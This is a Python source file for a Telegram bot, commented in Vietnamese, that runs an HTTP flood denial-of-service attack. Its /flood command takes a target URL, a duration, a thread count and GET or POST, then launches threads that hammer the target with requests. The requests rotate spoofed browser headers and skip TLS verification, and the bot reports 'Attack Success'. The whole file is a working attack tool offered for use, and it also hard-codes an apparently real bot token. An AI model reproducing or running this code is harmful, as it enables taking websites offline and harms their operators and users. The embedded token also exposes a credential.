import telebot
import requests
import random
import threading
import time
import urllib3
import re

# Thay thế bằng token của bạn
TOKEN = '7667637653:AAFzvUQvPUANTxss3_jwa2SMSfvWZVq6x9s'
bot = telebot.TeleBot(TOKEN)

# Các danh sách header và cài đặt mã hóa
UA = [
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0_4 like Mac OS X) AppleWebKit/604.1.35 (KHTML, like Gecko) Mobile/15E148 Html5Plus/1.0 uni-app",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0_2 like Mac OS X) AppleWebKit/602.1.15 (KHTML, like Gecko) Mobile/15E148 Html5Plus/1.0 uni-app/"
]

accept_header = [
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
]

lang_header = ['en-US,en;q=0.5', 'he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7']
encoding_header = ['gzip, deflate', 'gzip, deflate, br']
controle_header = ['no-cache', 'max-age=604800']

def random_header():
    """Tạo header ngẫu nhiên."""
    return {
        "User-Agent": random.choice(UA),
        "Accept": random.choice(accept_header),
        "Accept-Language": random.choice(lang_header),
        "Accept-Encoding": random.choice(encoding_header),
        "Cache-Control": random.choice(controle_header)
    }

@bot.message_handler(commands=['start'])
def start(message):
    """Lệnh /start"""
    bot.reply_to(message, "Chào mừng!\n↣Sử dụng /flood để xem tính năng.")

@bot.message_handler(commands=['flood'])
def flood(message):
    """Lệnh /flood để bắt đầu flood"""
    try:
        # Parse message nhận target, thời gian, threads và phương thức từ tin nhắn
        args = message.text.split()
        if len(args) != 5:
            bot.reply_to(message, "Sai cú pháp! Hãy gửi lệnh như sau:\n/flood <target> <time> <threads> <method>")
            return

        target = args[1]
        flood_time = int(args[2])
        threads = int(args[3])
        method = args[4].upper()

        if method not in ["GET", "POST"]:
            bot.reply_to(message, "Phương thức chỉ hỗ trợ GET hoặc POST.")
            return

        bot.reply_to(message, f"🌐Attack Success🌐\n↣Link: {target}\n↣Time: {flood_time}s\n↣Threads: {threads}\n↣Methods: {method}.")

        # Chạy flood với threading
        threads_list = []
        for _ in range(threads):
            t = threading.Thread(target=start_flood, args=(target, flood_time, method))
            t.start()
            threads_list.append(t)

        for t in threads_list:
            t.join()

        bot.send_message(message.chat.id, "Attack Completed and End of Attack")
    except Exception as e:
        bot.reply_to(message, f"Lỗi: {e}")

def start_flood(target, flood_time, method):
    """Thực hiện flood HTTP GET hoặc POST"""
    end_time = time.time() + flood_time
    while time.time() < end_time:
        try:
            headers = random_header()
            if method == "GET":
                requests.get(target, headers=headers, timeout=5, verify=False)
            elif method == "POST":
                requests.post(target, headers=headers, timeout=5, verify=False)
        except Exception:
            continue

# Khởi chạy bot
if __name__ == '__main__':
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    bot.polling()